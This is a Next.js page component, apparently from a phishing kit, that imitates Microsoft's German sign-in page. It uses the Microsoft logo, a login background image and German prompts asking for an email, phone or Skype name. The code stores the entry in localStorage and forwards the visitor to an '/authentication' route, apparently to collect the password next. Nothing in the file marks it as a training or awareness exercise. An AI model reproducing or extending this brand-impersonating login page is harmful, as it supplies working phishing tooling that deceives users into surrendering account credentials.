'use client';

import Image from "next/image";
import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function Home() {
  const router = useRouter();
  const [userInput, setUserInput] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Save user input to local storage
    localStorage.setItem('userInput', userInput);
    // Redirect to the authentication page
    router.push('/authentication');
  };

  return (
    <div 
      className="h-screen bg-cover bg-center" 
      style={{backgroundImage: "url('/microsoft-login-background.jpg')"}}>
      <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen">
        <main className="flex flex-col gap-8 row-start-2 items-start p-12 bg-white shadow-lg">
          <Image
            src="/Microsoft_logo.svg"
            alt="Microsoft logo"
            width={130}
            height={30}
            priority
          />
          <h1 className="font-sans font-bold text-[28px]">Anmelden</h1>
          <form className="w-full flex flex-col gap-8 row-start-2 items-start" onSubmit={handleSubmit}>
            <input
              type="text"
              id="userInput"
              name="userInput"
              className="block w-full min-w-[365px] py-2 border-b-2 border-gray-300 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
              placeholder="E-Mail-Adresse, Telefonnummer oder Skype-Name"
              value={userInput}
              onChange={(e) => setUserInput(e.target.value)}
            />
            <p>Kein Konto? <a href="" className="text-blue-500">Eins erstellen!</a></p>
            <div className="self-end">
              <button type="submit" className="bg-blue-500 text-white px-10 py-2">Weiter</button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};